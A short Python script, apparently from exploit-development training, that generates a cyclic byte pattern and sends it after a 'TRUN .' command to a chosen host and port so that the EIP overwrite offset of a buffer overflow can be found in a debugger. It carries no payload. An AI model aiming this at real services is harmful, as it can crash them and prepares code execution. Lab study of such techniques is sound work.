# fuzzer_pattern.py
import socket

def generate_pattern(length):
    pattern = b""
    for a in b"ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for b in b"abcdefghijklmnopqrstuvwxyz":
            for c in b"0123456789":
                if len(pattern) < length:
                    pattern += bytes([a]) + bytes([b]) + bytes([c])
                else:
                    return pattern
    return pattern[:length]

def main():
    print("=== Pattern Fuzzer ===")
    target = input("Target IP: ").strip()
    port = int(input("Port: ").strip())
    length = int(input("Pattern length (e.g., 3000): ").strip())

    pattern = generate_pattern(length)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"TRUN ." + pattern + b"\r\n")
        s.close()
        print("[+] Pattern sent. Check your debugger for the EIP value.")
    except Exception as e:
        print(f"[!] Failed to send pattern: {e}")

if __name__ == "__main__":
    main()
